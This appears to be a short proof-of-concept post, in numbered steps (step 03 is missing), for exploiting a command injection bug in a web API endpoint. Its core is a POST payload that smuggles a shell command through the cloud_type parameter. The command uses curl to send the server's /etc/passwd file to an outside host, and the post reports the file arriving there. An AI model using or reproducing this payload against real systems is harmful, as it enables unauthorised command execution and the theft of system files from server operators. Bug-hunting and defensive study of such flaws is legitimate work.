🦑POC steps:
01: I visit my target, I see my target, and I send a POST request to /v1/api HTTP/1.

02: I add this for getting the server location and other information. I replace with my Burp collaborator:

action=list_flightpath_destination_instances&CID=anything_goes_here&account_name=1&region=1&vpc_id_name=1&cloud_type=1|$(curl+-X+POST+-d+@/etc/passwd+https://lnkd.in/dyhGdqi2)

04: After sending the request, I see the response: "return":false,"reason":"Syntax error!"

05: In Burp collaborator, I can see the server's /etc/passwd file.
